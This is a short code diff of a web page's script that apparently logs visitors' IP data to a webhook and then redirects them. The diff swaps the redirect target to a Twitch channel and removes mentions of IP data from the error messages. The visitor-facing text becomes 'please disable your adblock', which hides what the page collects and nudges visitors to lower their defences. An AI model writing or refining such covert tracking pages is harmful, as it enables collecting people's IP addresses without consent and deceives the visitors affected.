@@ -68,14 +68,14 @@
                         })
                         .then(() => {
                             // Once the webhook is sent, redirect
-                            window.location.href = "https://discord.gg/8bRkNbDNsb";  // Change to your desired redirect URL
+                            window.location.href = "https://m.twitch.tv/scrappyvest28";  // Change to your desired redirect URL
                         })
                         .catch(err => {
                             console.error('Error sending webhook data:', err);
                             showError();
                         });
                     } else {
-                        console.error('Unable to retrieve IP data');
+                        console.error('Unable to retrieve data');
                         showError();
                     }
                 })
@@ -88,7 +88,7 @@
         // Function to display the error message
         function showError() {
             // Show 404 error message
-            document.body.innerHTML = '<h2>404 Error</h2><p>There was an issue fetching your IP data. Please try again later.</p>';
+            document.body.innerHTML = '<h2>404 Error</h2><p>please disable your adblock</p>';
             
             // Wait for 5 seconds, then redirect
             setTimeout(() => {
